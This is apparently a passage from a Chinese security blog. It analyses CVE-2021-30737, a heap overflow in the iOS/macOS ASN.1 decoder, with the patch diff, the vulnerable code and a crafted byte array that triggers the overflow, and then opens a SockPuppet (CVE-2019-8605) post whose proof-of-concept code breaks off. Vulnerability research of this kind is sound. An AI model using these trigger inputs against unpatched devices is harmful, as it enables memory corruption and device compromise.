<p>每个可以消耗输入的状态方法，都会被传递一个指向原始输入缓冲区中下一个未消耗的字节的指针（buf）和一个剩余未消耗的字节数（len）。然后这些方法返回他们所消耗的输入量，并通过更新上下文对象的状态字段来发出任何错误信号。</p>
<p>解析器可以是递归的：一个状态可以把它的-&gt;place字段设置为一个期望处理解析的子状态的状态，然后分配一个新的子状态。例如，当解析一个ASN.1序列时。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state-&gt;place = duringSequence;</span><br><span class="line">state = sec_asn1d_push_state(state-&gt;top, state-&gt;theTemplate + <span class="number">1</span>,</span><br><span class="line">                              state-&gt;dest, PR_TRUE);</span><br></pre></td></tr></table></figure>

<p>当前状态将自己的下一个状态设置为 duringSequence，然后调用 sec_asn1d_push_state，它分配了一个新的状态对象，有一个新的模板和一个父代的 dest 字段的副本。</p>
<p>sec_asn1d_push_state会更新上下文的当前字段，这样一来，SEC_ASN1DecoderUpdate的下一个循环就会把这个子状态视为当前状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cx-&gt;current = new_state;</span><br></pre></td></tr></table></figure>

<p>新分配的子的位置字段（决定当前状态）的初始值由模板决定。然后，该子代所遵循的状态机路径中的最终状态将负责将自己从状态堆栈中弹出，以便其父代可以到达 duringSequence 状态，以消费子代的结果。</p>
<h2 id="缓冲区管理"><a href="#缓冲区管理" class="headerlink" title="缓冲区管理"></a>缓冲区管理</h2><p>缓冲区管理是NSS ASN.1解析器开始变得非常令人费解的地方。如果你仔细阅读代码，你会注意到当输出缓冲区被填入时极度缺乏边界检查–基本上没有。例如，sec_asn1d_parse_leaf将原始编码的字符串字节复制到输出缓冲区中，但没有对字符串的长度与缓冲区的大小进行界限检查。</p>
<p>与其使用明确的边界检查来确保长度有效，不如依靠这样的事实来实现内存安全，即有效的ASN.1解码永远不会产生大于其输入的输出。</p>
<p>也就是说，没有任何形式的解压或输入扩展，所以任何解析的输出数据必须等于或短于编码它的输入。NSS利用这一点，将所有的输出缓冲区过度分配，使其与输入一样大。</p>
<p>对于原始字符串来说，这是很简单的：长度和输入都是提供的，所以实际上没有什么可以出错的。但是对于构造字符串来说，这就有点麻烦了……</p>
<p>构建字符串的一种方式是将其视为子字符串的树，最多嵌套32层。这里有一个例子。</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTR4nwonetxF1WHDpaUkJme_Ywz-VWc63Qy1j2PJJrAWN0Z7Drcal63h6umti0HFcEaAFlCIH8lmFFGTXkdRsrJ1fAtyzNCAw9c1alni0EPXiAHuRLDBsn0b0FcRRGOzH14wqaOueV_ThhnOWLhuJJbllQChJGfRY5i8VOIEoXsmYOgT4NEfgbs_l_4A/s600/image3%20%281%29.png" alt="An outer constructed definite length string with three children: a primitive string &quot;abc&quot;, a constructed indefinite length string and a primitive string &quot;ghi&quot;. The constructed indefinite string has two children, a primitive string &quot;def&quot; and an end-of-contents marker."></p>
<p>我们从一个构建好的确定长度的字符串开始。这个字符串的长度值L是构成这个字符串的剩余输入的完整大小；这个数量的输入字节应该被解析为子串，并连接起来形成解析后的输出。</p>
<p>在这一点上，NSS ASN.1字符串解析器使用该第一个输入字符串的长度L，为解析后的输出字符串分配输出缓冲区。这个缓冲区是一个过度分配的最坏情况。但真正有趣的部分是，NSS分配了输出缓冲区，然后立即扔掉了这个长度！这一点在快速浏览代码时可能不是那么明显。被分配的缓冲区被存储为缓冲区封装类型的Data字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cssm_data</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> Length;</span><br><span class="line">    <span class="type">uint8_t</span> * __nullable Data;</span><br><span class="line">&#125; SecAsn1Item, SecAsn1Oid;</span><br></pre></td></tr></table></figure>

<p>Length字段不是分配的Data缓冲区的大小。它是一个（特定类型的）计数，决定了Data所指向的缓冲区有多少比特或字节是有效的。(CVE-2016-1950是NSS中的一个错误，代码混淆了这些单位。)</p>
<p>与其将分配的缓冲区大小与缓冲区指针一起存储，不如在每次遇到子串时，解析器在当前正在解析的状态堆栈中往上走，找到最里面的确定长度的字符串。当它向上查询的时候，会检查每个状态，以确定它已经消耗了多少输入，以便能够确定当前要解析的子串是否完全被包围在最内层的定长字符串中。如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">sec_asn1d_state *parent = sec_asn1d_get_enclosing_construct(state);</span><br><span class="line"><span class="keyword">while</span> (parent &amp;&amp; parent-&gt;indefinite) &#123;</span><br><span class="line">  parent = sec_asn1d_get_enclosing_construct(parent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> remaining = parent-&gt;pending;</span><br><span class="line">parent = state;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!sec_asn1d_check_and_subtract_length(&amp;remaining,</span><br><span class="line">                                           parent-&gt;consumed,</span><br><span class="line">                                           state-&gt;top)</span><br><span class="line">      ||</span><br><span class="line">      <span class="comment">/* If parent-&gt;indefinite is true, parent-&gt;contents_length is</span></span><br><span class="line"><span class="comment">       * zero and this is a no-op. */</span></span><br><span class="line">      !sec_asn1d_check_and_subtract_length(&amp;remaining,</span><br><span class="line">                                           parent-&gt;contents_length,</span><br><span class="line">                                           state-&gt;top)</span><br><span class="line">      ||</span><br><span class="line">      <span class="comment">/* If parent-&gt;indefinite is true, then ensure there is enough</span></span><br><span class="line"><span class="comment">       * space for an EOC tag of 2 bytes. */</span></span><br><span class="line">      (  parent-&gt;indefinite</span><br><span class="line">          &amp;&amp;</span><br><span class="line">          !sec_asn1d_check_and_subtract_length(&amp;remaining,</span><br><span class="line">                                               <span class="number">2</span>,</span><br><span class="line">                                               state-&gt;top)</span><br><span class="line">      )</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="comment">/* This element is larger than its enclosing element, which is</span></span><br><span class="line"><span class="comment">       * invalid. */</span></span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> ((parent = sec_asn1d_get_enclosing_construct(parent))</span><br><span class="line">         &amp;&amp;</span><br><span class="line">         parent-&gt;indefinite);</span><br></pre></td></tr></table></figure>

<p>首先沿着状态栈向上走，找到最内层构建的确定状态，并使用其状态&gt;待定值作为上限。然后，再走一遍状态栈，对于每一个中间状态，从原来的挂起值中减去那些中间状态可能消耗的字节数。很明显，待定值是非常重要的；它被用来确定一个上限，所以如果我们把它弄乱了，这个 “边界检查 “就会出错。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>漏洞位于<code>sec_asn1d_parse_bit_string</code>中，包含 ASN.1 解析器的 MacOS 11.4 和 11.3 版本的<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/Security/Security-59754.120.12/OSX/libsecurity_asn1/lib/secasn1d.c.auto.html">secasn1d.c之间的差异：</a></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/OSX/libsecurity_asn1/lib/secasn1d.c b/OSX/libsecurity_asn1/lib/secasn1d.c</span></span><br><span class="line"><span class="comment">index f338527..5b4915a 100644</span></span><br><span class="line"><span class="comment">--- a/OSX/libsecurity_asn1/lib/secasn1d.c</span></span><br><span class="line"><span class="comment">+++ b/OSX/libsecurity_asn1/lib/secasn1d.c</span></span><br><span class="line"><span class="meta">@@ -434,9 +434,6 @@</span> loser:</span><br><span class="line">         PORT_ArenaRelease(cx-&gt;our_pool, state-&gt;our_mark);</span><br><span class="line">         state-&gt;our_mark = NULL;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="deletion">-    if (new_state != NULL) &#123;</span></span><br><span class="line"><span class="deletion">-        PORT_Free(new_state);</span></span><br><span class="line"><span class="deletion">-    &#125;</span></span><br><span class="line">     return NULL;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@@ -1794,19 +1791,13 @@</span> sec_asn1d_parse_bit_string (sec_asn1d_state *state,</span><br><span class="line">     /*PORT_Assert (state-&gt;pending &gt; 0); */</span><br><span class="line">     PORT_Assert (state-&gt;place == beforeBitString);</span><br><span class="line"><span class="deletion">-    if ((state-&gt;pending == 0) || (state-&gt;contents_length == 1)) &#123;</span></span><br><span class="line"><span class="addition">+    if (state-&gt;pending == 0) &#123;</span></span><br><span class="line">                if (state-&gt;dest != NULL) &#123;</span><br><span class="line">                        SecAsn1Item *item = (SecAsn1Item *)(state-&gt;dest);</span><br><span class="line">                        item-&gt;Data = NULL;</span><br><span class="line">                        item-&gt;Length = 0;</span><br><span class="line">                        state-&gt;place = beforeEndOfContents;</span><br><span class="line"><span class="deletion">-               &#125;</span></span><br><span class="line"><span class="deletion">-               if(state-&gt;contents_length == 1) &#123;</span></span><br><span class="line"><span class="deletion">-                       /* skip over (unused) remainder byte */</span></span><br><span class="line"><span class="deletion">-                       return 1;</span></span><br><span class="line"><span class="deletion">-               &#125;</span></span><br><span class="line"><span class="deletion">-               else &#123;</span></span><br><span class="line"><span class="deletion">-                       return 0;</span></span><br><span class="line"><span class="addition">+            return 0;</span></span><br><span class="line">                &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>在确定边界检查可能会出问题以后，看一下<code>sec_asn1d_parse_bit_string</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">sec_asn1d_parse_bit_string</span> <span class="params">(sec_asn1d_state *state, <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">unsigned</span> <span class="type">long</span> len)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*PORT_Assert (state-&gt;pending &gt; 0); */</span></span><br><span class="line">    PORT_Assert (state-&gt;place == beforeBitString);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> ((state-&gt;pending == <span class="number">0</span>) || $(state-&gt;contents_length == <span class="number">1</span>)$) &#123;</span><br><span class="line">        <span class="keyword">if</span> (state-&gt;dest != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            SecAsn1Item *item = (SecAsn1Item *)(state-&gt;dest);</span><br><span class="line">            item-&gt;Data = <span class="literal">NULL</span>;</span><br><span class="line">            item-&gt;Length = <span class="number">0</span>;</span><br><span class="line">            state-&gt;place = beforeEndOfContents;</span><br><span class="line">        &#125;</span><br><span class="line">				</span><br><span class="line">        $ <span class="keyword">if</span>(state-&gt;contents_length == <span class="number">1</span>) &#123;</span><br><span class="line">        $     <span class="comment">/* skip over (unused) remainder byte */</span></span><br><span class="line">        $     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        $ &#125;</span><br><span class="line">        $ <span class="keyword">else</span> &#123;</span><br><span class="line">        $     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        $ &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        state-&gt;top-&gt;status = needBytes;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    byte = (<span class="type">unsigned</span> <span class="type">char</span>) *buf;</span><br><span class="line">    <span class="keyword">if</span> (byte &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        dprintf(<span class="string">&quot;decodeError: parse_bit_string remainder oflow\n&quot;</span>);</span><br><span class="line">        PORT_SetError (SEC_ERROR_BAD_DER);</span><br><span class="line">        state-&gt;top-&gt;status = decodeError;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    state-&gt;bit_string_unused_bits = byte;</span><br><span class="line">    state-&gt;place = duringBitString;</span><br><span class="line">    state-&gt;pending -= <span class="number">1</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$注释的区域是被补丁删除的部分。这个函数的目的是返回它所消耗的输入字节数（由buf指向），我最初的直觉是注意到补丁删除了一个通过这个函数的路径，在那里你可以得到所消耗的输入字节数和待定字节数的同步。应该是这样的，当他们在被删除的代码中返回1时，他们也会递减state&gt;pending，就像他们在该函数返回1的其他地方所做的那样。</p>
<p>达到这个状态时，buf指向一个原始位串的长度值之后的第一个字节。state&gt;contents_length是这个解析后的长度值。正如前面所讨论的，位串是一种独特的ASN.1字符串类型，因为它们在开头有一个额外的元数据字节（未使用的位数字节）。有一个明确的零长度的字符串是完全可以的–事实上，这在prepareForContents状态中已经（有点）提前处理了，它直接短路到afterEndOfContents。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (state-&gt;contents_length == <span class="number">0</span> &amp;&amp; (! state-&gt;indefinite)) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * A zero-length simple or constructed string; we are done.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  state-&gt;place = afterEndOfContents;</span><br></pre></td></tr></table></figure>

<p>这里他们检测的是一个内容长度为0的确定长度的字符串类型。但这并没有处理一个只由未使用的位数字节组成的位串的边缘情况。该位串的state&gt;contents_length值将是1，但它实际上没有任何 内容。</p>
<p>sec_asn1d_parse_bit_string中的(state&gt;contents_length &#x3D;&#x3D; 1)条件正是符合这种情况。</p>
<p>通过将state&gt;place设置为beforeEndOfContents，他们再次试图绕过状态机，跳到字符串内容被消耗后的状态。但在这里，他们采取了一个额外的步骤，而在prepareForContents中他们并没有采取同样的步骤。除了更新state&gt;place之外，他们还把目的地SecAsn1Item的Data字段空出来，并把Length设置为0。</p>
<p>前面提到，为递归解析构建的字符串的子字符串而分配的新子状态得到了父状态的dest字段的副本（它是一个指向输出缓冲区的指针）。(从技术上讲，如果最外层的字符串是无限长的，实际上不是这样的，对这种情况有单独的处理，而是建立一个子字符串的链接列表，最终被连接起来，见sec_asn1d_concat_substrings)。</p>
<p>如果输出缓冲区只分配一次，那么如果你像这里一样将数据设置为NULL会怎样？退一步讲，这实际上有任何意义吗？</p>
<p>不，我不认为这有任何意义。在这一点上，将Data设置为NULL至少会导致内存泄漏，因为它是输出缓冲区的唯一指针。</p>
<p>但有趣的是，这并不是将该指针设为NULL的唯一后果， item-&gt;Data被用来发出其他信号。</p>
<p>下面是prepare_for_contents的一个片段，当它确定输出缓冲区中是否有足够的空间给这个子串时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (state-&gt;substring) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * If we are a substring of a constructed string, then we may</span></span><br><span class="line"><span class="comment">   * not have to allocate anything (because our parent, the</span></span><br><span class="line"><span class="comment">   * actual constructed string, did it for us).  If we are a</span></span><br><span class="line"><span class="comment">   * substring and we *do* have to allocate, that means our</span></span><br><span class="line"><span class="comment">   * parent is an indefinite-length, so we allocate from our pool;</span></span><br><span class="line"><span class="comment">   * later our parent will copy our string into the aggregated</span></span><br><span class="line"><span class="comment">   * whole and free our pool allocation.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (item-&gt;Data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    PORT_Assert (item-&gt;Length == <span class="number">0</span>);</span><br><span class="line">    poolp = state-&gt;top-&gt;our_pool;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alloc_len = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如果此时 item-&gt;Data 是 NULL，state&gt;substring 是真的，那么一定是他们目前正在解析一个外层不确定字符串的子串，这个字符串没有已经分配的确定大小的缓冲区。在这种情况下，item-&gt;Data指针的含义与我们前面描述的不同：它只是一个临时缓冲区，目的是只容纳这个子串。就在上面，alloc_len被设置为这个子串的内容长度；对于外部定义长度的情况，至关重要的是alloc_len在这里被设置为0（这实际上是表明一个缓冲区已经被分配了，他们必须不分配一个新的。）</p>
<p>为了强调这个潜在的微妙之处：问题在于，使用这个连词（state&gt;substring &amp;&amp; !item-&gt;Data）来确定这是一个确定长度的子串还是外层不确定的字符串，与我们前面看到的复杂的边界检查代码所使用的方法不同。那个方法是沿着当前状态堆栈向上走，检查超字符串的不定位，以确定它们是否在处理一个外层不定字符串的子串。</p>
<p>假设我们有一个外层定长构造的比特串，有三个原始比特串作为子串。</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJrFict8RB7ceuAnNar7zlVvCo6pD9Li2Pbf3LJneP7BuRb9W7ZDtn-QMp4oofVurZqXctrbIJy_qXQ_NmvyteSEoqOeXmuk2W2JqrWl7_bIyKZk3C7HuN5zv3rLmT6fX5BZjoQAdAm_PQHl8b2xvEPFAAD9IP-WFKJcgzh_n_Sg5FZAZsT0FcHu5-tw/s600/image5%20%281%29.png" alt="img"></p>
<p>在遇到第一个最外层的确定长度的比特串时，代码将分配一个固定大小的缓冲区，其大小足以存储构成这个字符串的所有剩余输入，在本例中是42字节。在这一点上，dest-&gt;Data指向该缓冲区。</p>
<p>然后他们分配一个子状态，获得dest指针的拷贝（不是dest SecAsn1Item对象的拷贝；是指向它的指针的拷贝），并继续解析第一个子字符串。</p>
<p>这是一个长度为1的原始位串，它触发了sec_asn1d_parse_bit_string中的脆弱路径并将dest-&gt;Data设置为NULL。状态机跳转到beforeEndOfContents，然后最终下一个子串被解析–这次dest-&gt;Data &#x3D;&#x3D; NULL。</p>
<p>现在逻辑出了问题，正如我们在上面的片段中看到的，一个新的dest-&gt;Data缓冲区被分配，其大小只有这个子串（2字节），而事实上dest-&gt;Data应该已经指向一个足够大的缓冲区来容纳整个外层不确定的输入字符串。然后，这个子串的内容被解析并复制到该缓冲区。</p>
<p>现在我们来到了第三个子串。 dest-&gt;Data不再是NULL；但是代码现在没有办法确定缓冲区实际上只是（错误地）被分配来容纳一个子串。它相信 item-&gt;Data 只被分配一次的不变性，当遇到第一个外层确定长度的字符串时，它仅用这个事实来确定 dest-&gt;Data 是否指向一个足够大的缓冲区，以便将这个子串追加到其中。然后它很高兴地追加了这第三个子串，在分配给只存储第二个子串的缓冲区的范围之外写入。</p>
<p><strong>这里有一个很好的内存破坏原语：可以造成一个受控大小的分配，然后用任意数量的任意字节溢出它们。</strong></p>
<p>触发的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> concat_bitstrings_constructed_definite_with_zero_len_realloc[]</span><br><span class="line">     = &#123;ASN1_CLASS_UNIVERSAL | ASN1_CONSTRUCTED | ASN1_BIT_STRING, <span class="comment">// (0x23)</span></span><br><span class="line">        <span class="number">0x4a</span>, <span class="comment">// initial allocation size</span></span><br><span class="line">        ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING,</span><br><span class="line">        <span class="number">0x1</span>, <span class="comment">// force item-&gt;Data = NULL</span></span><br><span class="line">        <span class="number">0x0</span>, <span class="comment">// number of unused bits in the final byte</span></span><br><span class="line">        ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING,</span><br><span class="line">        <span class="number">0x2</span>, <span class="comment">// this is the reallocation size</span></span><br><span class="line">        <span class="number">0x0</span>, <span class="comment">// number of unused bits in the final byte</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="comment">// only byte of bitstring</span></span><br><span class="line">        ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING,</span><br><span class="line">        <span class="number">0x41</span>, <span class="comment">// 64 actual bytes, plus the remainder, will cause 0x40 byte memcpy one byte in to 2 byte allocation</span></span><br><span class="line">        <span class="number">0x0</span>, <span class="comment">// number of unused bits in the final byte</span></span><br><span class="line">        <span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="comment">// -- continues for overflow</span></span><br></pre></td></tr></table></figure>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html?m=1">https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html?m=1</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-04-05T06:25:50.000Z" title="2022/4/5 14:25:50">2022-04-05</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-03T08:13:52.211Z" title="2022/5/3 16:13:52">2022-05-03</time></span><span class="level-item">an hour read (About 7429 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/04/05/iOS-SockPuppet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">iOS-SockPuppet漏洞利用</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞编号为CVE-2019-8605，在iOS 12.3中进行了修复，但是在12.4又被利用了，随后在iOS 12.4.1中进行了修复。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html</a></p>
<p>原理讲解视频：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=YV3jewkUJ54">https://www.youtube.com/watch?v=YV3jewkUJ54</a></p>
</blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>此问题最早在2013年受到XNU的影响，并于2019年3月报告给Apple。然后在2019年5月在iOS 12.3中进行了修补（参考链接：<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806">https://bugs.chromium.org/p/project-zero/issues/detail?id=1806</a> 了完整的详细信息，包括iOS的漏洞分析，名为<code>SockPuppet</code>）。 2019年7月，然后发现此问题在iOS 12.4中也存在，后来在2019年8月下旬在iOS 12.4.1中进行了修补。</p>
<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>如何写一个 fuzz：</p>
<ol>
<li>先收集目标以往的漏洞；</li>
<li>在源代码中，找到漏洞对应的位置；</li>
<li>选择某一组件，该组件包含多个已公开漏洞；</li>
<li>编写fuzz；</li>
<li>fuzz该组件；</li>
<li>如果fuzz能够找到以前的漏洞，则它可能会发现新的漏洞；</li>
<li>当每次发现一个新的漏洞后，需要采取一定的措施，以防止再被命中。</li>
</ol>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/677764/">https://lwn.net/Articles/677764/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md">https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md</a></p>
</blockquote>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>POC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IP 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN6_ADDR_ANY &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN6_ADDR_LOOPBACK &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa1</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65000</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_LOOPBACK,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa2</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65001</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_ANY,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span 